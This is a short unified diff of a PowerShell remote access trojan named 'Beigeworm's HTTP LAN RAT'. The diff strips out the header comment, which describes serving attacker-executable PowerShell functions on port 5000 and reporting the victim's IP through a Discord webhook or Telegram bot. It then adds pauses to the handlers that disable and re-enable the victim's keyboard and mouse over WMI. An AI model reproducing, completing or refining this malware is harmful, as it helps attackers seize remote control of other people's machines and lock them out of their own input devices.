@@ -1,19 +1,3 @@
-﻿<#
-============================== Beigeworm's HTTP LAN RAT ===============================
-
-SYNOPSIS
-This script opens port 5000 on the machine and serves a simple webpage with powershell fuctions that can be executed.
-Attacker device must be on the same local area network.
-OPTIONAL - edit $whuri to you discord webhook to get a notification of the machines local IP
-
-INSTRUCTIONS
-Change all occurunces of WEBHOOK_HERE to a discord webhook
-Change all occurunces of TELEGRAM_TOKEN and CHAT_ID to your TG bot token and bots chad ID
-(Setup instructions here - https://github.com/beigeworm/BadUSB-Files-For-FlipperZero/blob/main/README.md)
-Run script and input given URL in a browser on another device.
-
-#>
-
 $whuri = "$dc"
 
 Write-Host "Starting Simple HTTP Server..." -ForegroundColor Green
@@ -216,6 +200,7 @@ Write-Output "Done."
 elseif ($ctx.Request.RawUrl -match "^/inputon") {     
 $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
 $PNPKeyboard.Enable()
+sleep 1
 $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
 $PNPMice.Enable()
 Write-Output "Done."
@@ -224,6 +209,7 @@ Write-Output "Done."
 elseif ($ctx.Request.RawUrl -match "^/inputoff") {     
 $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
 $PNPMice.Disable()
+sleep 1
 $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
 $PNPKeyboard.Disable()
 Write-Output "Done."
